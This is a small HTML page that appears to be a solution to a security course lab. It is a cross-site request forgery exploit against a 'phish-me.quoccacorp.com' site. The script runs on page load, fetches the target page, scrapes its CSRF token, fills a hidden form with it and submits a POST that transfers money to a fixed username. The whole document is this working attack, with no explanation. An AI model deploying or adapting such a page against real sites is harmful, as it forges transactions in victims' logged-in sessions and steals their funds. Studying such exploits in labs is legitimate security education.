<html>
<body>
<form id="transferForm" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
    <input type="hidden" name="csrf_token" id="csrfToken">
    <input type="hidden" name="username" value="z5481975">
    <input type="hidden" name="amount" value="100">
</form>
<script>
fetch('https://phish-me.quoccacorp.com/')
    .then(response => response.text())
    .then(data => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(data, 'text/html');
        const token = doc.querySelector('input[name="csrf_token"]').value;
        document.getElementById('csrfToken').value = token;
        document.getElementById('transferForm').submit();
    })
    .catch(error => console.error('Error fetching CSRF token:', error));
</script>
</body>
</html>
